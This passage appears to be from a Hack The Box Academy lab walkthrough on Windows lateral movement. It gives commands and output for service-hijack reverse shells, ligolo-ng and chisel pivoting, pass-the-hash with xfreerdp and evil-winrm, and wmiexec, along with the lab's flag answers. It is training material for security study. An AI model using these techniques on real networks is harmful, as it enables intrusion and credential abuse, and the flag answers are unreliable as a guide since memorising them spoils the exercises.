impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 change -name ALG -path "\\\\PWNIP\\share\\service-shell.exe"
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 change -name ALG -path "\\\\PWNIP\\share\\service-shell.exe"

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Changing service config for ALG
```

Subsequently, students will open a new terminal tab and start `netcat` on the port they have specified:

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ nc -nvlp 9001

listening on [any] 9001 ...
```

Students will proceed to utilize `impacket-services` to start the `ALG` service:

Code: shell

```shell
impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name ALG
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name ALG

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Starting service ALG
```

Switching to the terminal tab of `netcat`, students will come to know that a reverse shell connection was established and can proceed to grab the `serviceflag.txt` flag located in the `C:\Flags\` directory:

Code: shell

```shell
type C:\Flags\serviceflag.txt
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ nc -nvlp 9001

listening on [any] 9001 ...
connect to [10.10.14.221] from (UNKNOWN) [10.129.229.244] 61403
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> type C:\Flags\serviceflag.txt
```

Answer: `Using_Services_For_LateralMovement`

# Server Message Block (SMB)

## Question 3

### "Use any tool to get a shell on SRV02 and read the flag located at C:\\Users\\Administrator\\Desktop\\flag.txt"

Students will reuse the previously spawned target and reverse shell through the last question to grab the flag from the Administrator's desktop:

Code: shell

```shell
type C:\Users\Administrator\Desktop\flag.txt
```

```
C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
```

Answer: `Lateral_Movement_1s_Fun`

# Windows Management Instrumentation (WMI)

## Question 1

### "Use WMI queries with the class Win32\_OperatingSystem to retrieve information about SRV02. What's the serial number of the OS for SRV02:"

After spawning the target, students will proceed to establish an RDP session using the credentials `helen:RedRiot88`:

Code: shell

```shell
xfreerdp /v:STMIP /u:helen /p:RedRiot88 /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-14slkmk7v4]─[~]
└──╼ [★]$ xfreerdp /v:10.129.107.115 /u:helen /p:RedRiot88 /dynamic-resolution

[05:58:54:824] [12116:12128] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[05:58:54:824] [12116:12128] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[05:58:54:824] [12116:12128] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[05:58:54:875] [12116:12128] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:58:54:875] [12116:12128] [WARN][com.freerdp.crypto] - CN = SRV01.inlanefreight.local
[05:58:54:875] [12116:12128] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:58:54:875] [12116:12128] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[05:58:54:875] [12116:12128] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:58:54:875] [12116:12128] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.107.115:3389) 
[05:58:54:875] [12116:12128] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[05:58:54:875] [12116:12128] [ERROR][com.freerdp.crypto] - Common Name (CN):
[05:58:54:875] [12116:12128] [ERROR][com.freerdp.crypto] - 	SRV01.inlanefreight.local
[05:58:54:875] [12116:12128] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.107.115:3389 (RDP-Server):
	Common Name: SRV01.inlanefreight.local
	Subject:     CN = SRV01.inlanefreight.local
	Issuer:      CN = SRV01.inlanefreight.local
	Thumbprint:  04:d5:23:5c:1a:e6:9d:81:eb:81:f1:ee:17:4f:e3:c0:be:1c:55:e4:dd:d1:f8:f3:2f:f6:8d:14:ed:c7:da:88
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y
```

Subsequently, students will open `PowerShell` and use `wmic` to query the `SerialNumber` of `SRV02` (`172.20.0.52`):

Code: powershell

```powershell
wmic /node:172.20.0.52 os get SerialNumber
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\helen> wmic /node:172.20.0.52 os get SerialNumber
```

Answer: `00429-00521-62775-AA590`

# Windows Management Instrumentation (WMI)

## Question 2

### "Use WMI queries with the class Win32\_OperatingSystem to retrieve information about SRV02. What's the InstallDate value for SRV02:"

Students will reuse the previously established RDP session and `PowerShell`, and use `wmic` to query the `InstallDate` of `SRV02` (`172.20.0.52`):

Code: powershell

```powershell
wmic /node:172.20.0.52 os get InstallDate
```

```
PS C:\Users\helen> wmic /node:172.20.0.52 os get InstallDate
```

Answer: `20240513060539.000000-360`

# Windows Management Instrumentation (WMI)

## Question 3

### "Use WMI to get a reverse shell on SRV02 and read the flag located at C:\\Users\\helen\\Documents\\flag.txt"

Students will reuse the previously established RDP session, subsequently they will proceed to ping `SRV02` to uncover the IP address assigned to that machine:

Code: powershell

```powershell
ping SRV02
```

```
PS C:\Users\helen> ping SRV02

Pinging SRV02.inlanefreight.local [172.20.0.52] with 32 bytes of data:
Reply from 172.20.0.52: bytes=32 time=1ms TTL=128
Reply from 172.20.0.52: bytes=32 time<1ms TTL=128
Reply from 172.20.0.52: bytes=32 time<1ms TTL=128
Reply from 172.20.0.52: bytes=32 time<1ms TTL=128

Ping statistics for 172.20.0.52:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 1ms, Average = 0ms
```

Students will come to know that `SRV02` is part of an internal network, meaning that they will have to establish dynamic port-forwarding using a [ligolo-ng](https://github.com/nicocha30/ligolo-ng). On their workstations, students will proceed to download the respective versions for Linux and Windows from the [releases](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.6.2):

Code: shell

```shell
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip; wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip; wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
```

Once downloaded, students will proceed to extract the archives using `unzip` and `tar`:

Code: shell

```shell
unzip ligolo-ng_agent_0.6.2_windows_amd64.zip
tar xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
chmod +x proxy
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ unzip ligolo-ng_agent_0.6.2_windows_amd64.zip

Archive:  ligolo-ng_agent_0.6.2_windows_amd64.zip
  inflating: LICENSE                 
  inflating: README.md               
  inflating: agent.exe 

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ tar xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz 

LICENSE
README.md
proxy

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ chmod +x proxy
```

Students will start a Python HTTP server to transfer the `chisel.exe` onto the target machine:

Code: shell

```shell
python3 -m http.server
```

```
┌─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Subsequently, students will return to the RDP session and the previously spawned `PowerShell` window, where they will proceed to download the executable:

Code: powershell

```powershell
iwr -uri http://PWNIP:8000/agent.exe -o agent.exe
```

```
PS C:\Users\helen> iwr -uri http://10.10.15.174:8000/agent.exe -o agent.exe
```

Students will return to their workstations, they can terminate the Python HTTP server, and they will proceed to start `ligolo`'s proxy:

Code: shell

```shell
./proxy -selfcert
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ ./proxy -selfcert

WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
WARN[0000] TLS Certificate fingerprint for ligolo is: A910475F1FBB2F071C47BC3CCF0685188A816C82CB654A25505479E67071293B 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ \`/ __ \/ / __ \______/ __ \/ __ \`/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.6.2

ligolo-ng » 
```

Subsequently, students will return to the RDP session to establish the dynamic port-forwarding using the agent previously transferred:

Code: powershell

```powershell
.\agent.exe -connect PWNIP:11601 -ignore-cert
```

```
PS C:\Users\helen> .\agent.exe -connect 10.10.14.221:11601 -ignore-cert

time="2024-07-11T03:49:21-05:00" level=warning msg="warning, certificate validation disabled"
time="2024-07-11T03:49:21-05:00" level=info msg="Connection established" addr="10.10.14.221:11601"
```

Subsequently, students need to return to their workstations, open a new tab, and proceed to add a new network interface based on their usernames in the workstation (e.g. `htb-ac-XXXX`) and the subnet of the internal network. Additionally, students will query the `my_credentials.txt` file located on the Desktop to get t

Code: shell

```shell
cat Desktop/my_credentials.txt | grep Username
sudo ip tuntap add user <htb-ac-XXXX> mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.20.0.0/24 dev ligolo
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ cat Desktop/my_credentials.txt | grep Username
Username: htb-ac-8414

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ sudo ip tuntap add user htb-ac-8414 mode tun ligolo

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ sudo ip link set ligolo up

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ sudo ip route add 172.20.0.0/24 dev ligolo
```

Students will return to `ligolo`'s proxy console, use the `session` command, select the agent, and initiate the tunnel (they need to press `Enter` after session):

Code: shell

```shell
session
start
```

```
INFO[6389] Agent joined.                                 name="INLANEFREIGHT\\helen@SRV01" remote="10.129.229.244:49730"
ligolo-ng » session 
? Specify a session : 2 - #2 - INLANEFREIGHT\helen@SRV01 - 10.129.229.244:49730

[Agent : INLANEFREIGHT\helen@SRV01] » start
INFO[6744] Starting tunnel to INLANEFREIGHT\helen@SRV0
```

Right after they have established the tunnel to the internal network, students will proceed to utilize `wmiexec.py` from Impacket to get the contents of the `flag.txt` located in the `C:\Users\helen\Documents` directory:

Code: shell

```shell
wmiexec.py inlanefreight/helen:RedRiot88@172.20.0.52 "more C:\Users\helen\Documents\flag.txt"
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-14slkmk7v4]─[~]
└──╼ [★]$ wmiexec.py inlanefreight/helen:RedRiot88@172.20.0.52 "more C:\Users\helen\Documents\flag.txt"

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
```

Answer: `Helen_WMI_Flag`

# Windows Remote Management (WinRM)

## Question 1

### "Use WinRM to connect to SRV01 and submit flag located at C:\\Users\\frewdy\\Desktop\\flag.txt"

After spawning the target, students will proceed to connect using `evil-winrm` and the credentials `Frewdy:Kiosko093`:

Code: shell

```shell
evil-winrm -i STMIP -u Frewdy -p Kiosko093
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-1qi0mc04vu]─[~]
└──╼ [★]$ evil-winrm -i 10.129.229.244 -u Frewdy -p Kiosko093
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Frewdy\Documents>
```

Subsequently, students will proceed to grab the flag from `C:\Users\frewdy\Desktop`:

Code: shell

```shell
type C:\Users\frewdy\Desktop\flag.txt
```

```
*Evil-WinRM* PS C:\Users\Frewdy\Documents> type C:\Users\frewdy\Desktop\flag.txt 
```

Answer: `Testing_WINRM_Connection`

# Windows Remote Management (WinRM)

## Question 2

### "Use Leonvqz hash to connect to SRV02 and read the flag located at C:\\Users\\Leonvqz\\Desktop\\flag.txt"

Students will reuse the previously established WinRM session and will proceed to ping `SRV02`:

Code: shell

```shell
ping SRV02
```

```
*Evil-WinRM* PS C:\Users\Frewdy\Documents> ping SRV02

Pinging SRV02.inlanefreight.local [172.20.0.52] with 32 bytes of data:
Reply from 172.20.0.52: bytes=32 time=1ms TTL=128
Reply from 172.20.0.52: bytes=32 time<1ms TTL=128
Reply from 172.20.0.52: bytes=32 time<1ms TTL=128
Reply from 172.20.0.52: bytes=32 time<1ms TTL=128

Ping statistics for 172.20.0.52:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 1ms, Average = 0ms
```

Subsequently, students will come to know that `SRV02` is part of an internal network, meaning that they will have to establish dynamic port-forwarding using a [chisel](https://github.com/jpillora/chisel). On their workstations, students will proceed to download the respective versions for Linux and Windows from the [releases](https://github.com/jpillora/chisel/releases/tag/v1.9.1):

Code: shell

```shell
wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz; wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
```

```
┌─[✗]─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz; wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
```

Once downloaded, students will proceed to unzip them using `gunzip`:

Code: shell

```shell
gunzip chisel_1.9.1_*
```

```
┌─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ gunzip chisel_1.9.1_*
```

Subsequently, students will proceed to rename the `chisel_1.9.1_windows_amd64` to `chisel.exe`, then change the permissions over `chisel_1.9.1_linux_amd64` to be executable:

Code: shell

```shell
mv chisel_1.9.1_windows_amd64 chisel.exe
chmod +x chisel_1.9.1_linux_amd64
```

```
┌─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ mv chisel_1.9.1_windows_amd64 chisel.exe

┌─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ chmod +x chisel_1.9.1_linux_amd64
```

Students will use the `upload` functionality of `Evil-WinRM` to upload the `chisel.exe` executable onto the target:

Code: shell

```shell
upload chisel.exe
```

```
*Evil-WinRM* PS C:\Users\Frewdy\Documents> upload chisel.exe
                                        
Info: Uploading /home/htb-ac-8414/chisel.exe to C:\Users\Frewdy\Documents\chisel.exe
                                        
Data: 12008104 bytes of 12008104 bytes copied
                                        
Info: Upload successful!
```

Students will return to their workstations, they can terminate the Python HTTP server, and they will proceed to start `chisel` in `server` mode:

Code: shell

```shell
./chisel_1.9.1_linux_amd64 server --reverse 
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-1qi0mc04vu]─[~]
└──╼ [★]$ ./chisel_1.9.1_linux_amd64 server --reverse

2024/07/11 07:18:24 server: Reverse tunnelling enabled
2024/07/11 07:18:24 server: Fingerprint VDA2XZJTiqs3QRPtx7qBVak5SWzIMiWm53XD3b+AKF0=
2024/07/11 07:18:24 server: Listening on http://0.0.0.0:8080
```

Going back to the session in `Evil-WinRM`, students will connect to the `chisel` server in `client` mode:

Code: shell

```shell
.\chisel.exe client PWNIP:8080 R:socks
```

```
*Evil-WinRM* PS C:\Users\Frewdy\Documents> .\chisel.exe client 10.10.14.221:8080 R:socks

chisel.exe : 2024/07/11 07:19:55 client: Connecting to ws://10.10.14.221:8080
    + CategoryInfo          : NotSpecified: (2024/07/11 07:1....10.14.221:8080:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2024/07/11 07:19:55 client: Connected (Latency 8.8523ms)
```

Students will return to their workstations, open a new tab, and modify their `proxychains.conf` configurational file:

Code: shell

```shell
sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains.conf'
sudo sh -c 'sed -i s/9050/1080/g /etc/proxychains.conf'
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-1qi0mc04vu]─[~]
└──╼ [★]$ sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains.conf'

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-1qi0mc04vu]─[~]
└──╼ [★]$ sudo sh -c 'sed -i s/9050/1080/g /etc/proxychains.conf'
```

Students will proceed to connect to `SRV02` (`172.20.0.52`) via RDP using `xfreerdp`, providing the username `Leonvqz` and the hash `A35289033D176ABAAF6BEAA0AA681400`:

Code: shell

```shell
proxychains xfreerdp /v:172.20.0.52 /u:Leonvqz /pth:A35289033D176ABAAF6BEAA0AA681400 /dynamic-resolution /drive:.,student
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-1qi0mc04vu]─[~]
└──╼ [★]$ proxychains xfreerdp /v:172.20.0.52 /u:Leonvqz /pth:A35289033D176ABAAF6BEAA0AA681400 /dynamic-resolution /drive:.,student

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.20.0.52:3389  ...  OK
[07:05:49:444] [35059:35061] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[07:05:49:444] [35059:35061] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[07:05:49:444] [35059:35061] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[07:05:49:523] [35059:35061] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[07:05:49:523] [35059:35061] [WARN][com.freerdp.crypto] - CN = SRV02.inlanefreight.local
[07:05:49:525] [35059:35061] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:05:49:525] [35059:35061] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[07:05:49:525] [35059:35061] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:05:49:525] [35059:35061] [ERROR][com.freerdp.crypto] - The hostname used for this connection (172.20.0.52:3389) 
[07:05:49:525] [35059:35061] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[07:05:49:525] [35059:35061] [ERROR][com.freerdp.crypto] - Common Name (CN):
[07:05:49:525] [35059:35061] [ERROR][com.freerdp.crypto] - 	SRV02.inlanefreight.local
[07:05:49:525] [35059:35061] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 172.20.0.52:3389 (RDP-Server):
	Common Name: SRV02.inlanefreight.local
	Subject:     CN = SRV02.inlanefreight.local
	Issuer:      CN = SRV02.inlanefreight.local
	Thumbprint:  58:20:f6:6b:22:d2:a1:92:9e:47:2e:10:1b:03:10:67:90:af:9d:49:8b:81:40:c6:fa:f4:4e:56:47:c4:f2:e5
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y
```

Subsequently, students will open `PowerShell` and grab the flag located in the `C:\Users\Leonvqz\Desktop\` directory:

Code: powershell

```powershell
type C:\Users\Leonvqz\Desktop\flag.txt
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Leonvqz> type C:\Users\Leonvqz\Desktop\flag.txt
```

Answer: `Using_Hash_For_WinRM_LateralMov`

# Windows Remote Management (WinRM)

## Question 3

### "Connect to DC01 as Leonvqz and read the flag located at C:\\Users\\Leonvqz\\Desktop\\flag.txt"

Students will reuse the previously spawned target and previously established RDP session to ping `DC01` to uncover the IP address assigned to that machine:

Code: powershell

```powershell
ping DC01
```

Code: session

```
PS C:\Users\Leonvqz> ping DC01

Pinging dc01.inlanefreight.local [172.20.0.10] with 32 bytes of data:
Reply from 172.20.0.10: bytes=32 time<1ms TTL=128
Reply from 172.20.0.10: bytes=32 time<1ms TTL=128
Reply from 172.20.0.10: bytes=32 time<1ms TTL=128
Reply from 172.20.0.10: bytes=32 time<1ms TTL=128

Ping statistics for 172.20.0.10:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

Students will return to their workstations and open a new terminal tab, and they will establish a second `Evil-WinRM` on the initial target (`SRV01`):

Code: shell

```shell
evil-winrm -i STMIP -u Frewdy -p Kiosko093
```

```
┌─[eu-academy-5]─[10.10.14.228]─[htb-ac-8414@htb-fwzmhuxy3m]─[~]
└──╼ [★]$ evil-winrm -i 10.129.145.58 -u Frewdy -p Kiosko093
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Frewdy\Documents>
```

Subsequently, students will start the previously uploaded `chisel` executable in `server` mode:

Code: shell

```shell
.\chisel.exe server --reverse --port 8081
```

```
*Evil-WinRM* PS C:\Users\Frewdy\Documents> .\chisel.exe server --reverse --port 8081

chisel.exe : 2024/07/12 01:22:23 server: Reverse tunnelling enabled
    + CategoryInfo          : NotSpecified: (2024/07/12 01:2...nelling enabled:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2024/07/12 01:22:23 server: Fingerprint tZEnxjQoHuGTZMGyZaHAsLPInIbMl9DuGUEX3OiI8lI=2024/07/12 01:22:23 server: Listening on http://0.0.0.0:80812024/07/12 01:22:46
```

They will return to the previously established RDP session on `SRV02` (`172.20.0.52`), open `PowerShell` and upload `chisel`'s executable:

Code: powershell

```powershell
copy \\TSCLIENT\student\chisel.exe
```

```
PS C:\Users\Leonvqz> copy \\TSCLIENT\student\chisel.exe
```

Subsequently, students will proceed to initiate a connection to the chisel's server on `SRV01` in `client` mode from `SRV02`:

Code: powershell

```powershell
.\chisel.exe client 172.20.0.51:8081 R:2080:socks
```

```
PS C:\Users\Leonvqz> .\chisel.exe client 172.20.0.51:8081 R:2080:socks

2024/07/12 01:22:46 client: Connecting to ws://172.20.0.51:8081
2024/07/12 01:22:46 client: Connected (Latency 515.6µs)
```

Students will return to their workstations and append a new configurational setting in `/etc/proxychains.conf` tunneling the traffic on port `2080`:

Code: shell

```shell
sudo sh -c "echo socks5 127.0.0.1 2080 >> /etc/proxychains.conf"
```

```
┌─[eu-academy-5]─[10.10.14.228]─[htb-ac-8414@htb-fwzmhuxy3m]─[~]
└──╼ [★]$ sudo sh -c "echo socks5 127.0.0.1 2080 >> /etc/proxychains.conf"
```

Once they have appended the addition, students will connect with `Evil-WinRM` to `DC01` (`172.20.0.10`) as the user `Leonvqz` and the hash `A35289033D176ABAAF6BEAA0AA681400`:

Code: shell

```shell
proxychains evil-winrm -i 172.20.0.10 -u leonvqz -H A35289033D176ABAAF6BEAA0AA681400
```

```
┌─[eu-academy-5]─[10.10.14.228]─[htb-ac-8414@htb-fwzmhuxy3m]─[~]
└──╼ [★]$ proxychains evil-winrm -i 172.20.0.10 -u leonvqz -H A35289033D176ABAAF6BEAA0AA681400

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:2080  ...  172.20.0.10:5985  ...  OK
*Evil-WinRM* PS C:\Users\Leonvqz\Documents>
```

Subsequently, students can grab the flag located in the `C:\Users\Leonvqz\Desktop` directory:

Code: shell

```shell
type C:\Users\Leonvqz\Desktop\flag.txt
```

```
*Evil-WinRM* PS C:\Users\Leonvqz\Documents> type C:\Users\Leonvqz\Desktop\flag.txt

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:2080  ...  172.20.0.10:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:2080  ...  172.20.0.10:5985  ...  OK
```

Answer: `Restricted_Access_From_SRV02_Only`

# Distributed Component Object Model (DCOM)

## Question 1

### "Use Helen credentials to connect to SRV02 and read the flag located at C:\\Users\\helen\\Documents\\dcom.txt"

Students will prepare the necessary configuration of [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) , while downloading the appropriate binaries from the [releases](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.6.2) on their workstations:

Code: shell

```shell
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip; wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip; wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
```

Once downloaded, students will proceed to extract the archives using `unzip` and `tar`:

Code: shell

```shell
unzip ligolo-ng_agent_0.6.2_windows_amd64.zip
tar xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
chmod +x proxy
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ unzip ligolo-ng_agent_0.6.2_windows_amd64.zip

Archive:  ligolo-ng_agent_0.6.2_windows_amd64.zip
  inflating: LICENSE                 
  inflating: README.md               
  inflating: agent.exe 

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ tar xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz 

LICENSE
README.md
proxy

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ chmod +x proxy
```

Students will start a Python HTTP server to transfer the `chisel.exe` onto the target machine:

Code: shell

```shell
python3 -m http.server
```

```
┌─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Subsequently, students establish an RDP session with the target using the credentials `helen:RedRiot88`:

Code: shell

```shell
xfreerdp /v:STMIP /u:helen /p:RedRiot88 /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.228]─[htb-ac-8414@htb-xqphib3snx]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.244 /u:helen /p:RedRiot88 /dynamic-resolution

[03:02:01:084] [5510:5511] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[03:02:01:085] [5510:5511] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[03:02:01:085] [5510:5511] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[03:02:01:141] [5510:5511] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
